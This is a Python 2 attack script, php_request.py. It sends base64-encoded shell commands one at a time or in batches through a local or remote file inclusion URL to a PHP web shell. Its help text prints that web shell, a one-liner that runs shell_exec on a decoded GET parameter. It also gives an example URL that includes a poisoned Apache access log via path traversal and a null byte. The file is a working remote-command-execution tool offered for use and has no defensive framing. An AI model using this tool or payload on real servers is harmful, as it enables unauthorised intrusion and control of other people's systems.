!/usr/bin/python2

import sys, urllib, base64
import requests


class requestor ():
    def __init__(s, a, b, c):
        s.inp = ""  ## user input temp var
        s.exits = ["exit", "quit", "EXIT", "QUIT"]
        s.URL = a
        s.substr = b
        s.single_mode = c


    def runtime(s, a=0):
        if s.single_mode != 0:
            s.single()
        else:
            s.multi(a)

    def single(s):
        tmp = urllib.quote_plus(base64.b64encode(s.single_mode))
        pmt = s.URL.replace(s.substr, tmp)
        print "\nSending: \n" + s.single_mode, "\n", tmp
        s.r = requests.get(pmt)
        print pmt
        t = ""
        while t != "1" and t != "2":
            t = raw_input("Print response?\n[1] Yes\n[2] No\n>:")
        if t == "1":
            print s.r.text
        sys.exit()

    def multi(s, a=0):
        while s.inp not in s.exits[:]:
            s.init_run()
            print(
            "\n[!!] Give heredoc.  End heredoc input with \"EOF\".  \"EOF+\" to end plus print responses.  Quit with \"exit\".:")
            while s.inp != "EOF" and s.inp != "EOF+" and s.inp not in s.exits[:]:
                s.inp = raw_input("")
                s.what_do()
            s.worker()
            s.informer()
            if a == 1:
                # requestor(0) user decides when to quit
                # requestor(1) runtime dictates quit after first iteration
                s.inp = "exit"

    def init_run(s):
        s.inp = ""  ## user input temp var
        s.qi = []  ## holds list of inputs
        s.qo = []  ## holds list of urlencode(b64encode(qi)) outputs
        s.qr = []  ## for teh responses
        s.responses = 0


    def what_do(s):
        if s.inp in s.exits:
            sys.exit()
        if s.inp != "EOF" and s.inp != "EOF+":
            s.qi.append(s.inp)
            s.qo.append(urllib.quote_plus(base64.b64encode(s.inp)))
        if s.inp == "EOF+":
            s.responses = 1

    def worker(s):
        for item, meti in zip(s.qi[:], s.qo[:]):
            print "\nSending: \n"+ item, "\n", meti
            tmp = s.URL.replace(s.substr, meti)
            print tmp
            s.r = requests.get(tmp)
            if s.responses == 1:
                s.qr.append(s.r.text)
            print "\tHTTP response code: " + str(s.r.status_code)

    def informer(s):
        if s.responses == 1:
            x = raw_input("[!] Press any key to see the responses, pause-delimited.")
            print "\n\n\n"
            for item in s.qr[:]:
                print item + "\n\n"
                x = raw_input("[!] Press any key to continue.")
                print "\n\n\n"




if __name__ == "__main__":
    def prepare():
        helps = ['-h', '--help']
        l = len(sys.argv)
        if l == 2:
            if sys.argv[1] in helps[:]:
                helptxt()
                sys.exit()
        cmd = 0
        if l == 4:
            cmd = sys.argv[3]
        if l >= 3:
            URL = sys.argv[1]
            substr = sys.argv[2]
        else:
            URL = raw_input("Give the LFI/RFI URL.:\n:>")
            substr = raw_input("What character sequence to inject b64 output in place of?\n:>")
        if not URL.find(substr) != -1:
            print("ERROR!!!  character sequence " + substr + " not in this URL!!! Exiting.")
            sys.exit()
        if not URL.find("http://") != -1:
            URL = "http://" + URL
        return URL, substr, cmd


    def helptxt():
        print \
"""### Hey, if you can get it somewhere...
<xxx?php $b = chr(10); $a = base64_decode($_GET['cmd']); echo $b, $b, $a, $b, shell_exec($a); ?>
./php_request.py  (no args)
./php_request.py  "[url]"  "[char sequence to replace on)]" "[optional: single mode: command string]"
./php_request.py  "http://127.0.0.1?somevar=null&cmd=querty&COUNTRY=../../../../c:\apache\logs\access.log%00"  "querty"
## Modes
0 args = prompt for URL, substring, iterate heredoc mode until user quits
2 args = 1:URL  2:substring, iterate heredoc mode until user quits
3 args = 1:URL  2:substring  3:commandstr, single request then quit """


    def main():
        # a URL, b substring, c command string
        a,b,c = prepare()
        obj=requestor(a,b,c)
        obj.runtime(0)  # runtime(0), heredoc iter till user quit;  runtime(1), quit after first heredoc iter


    main()
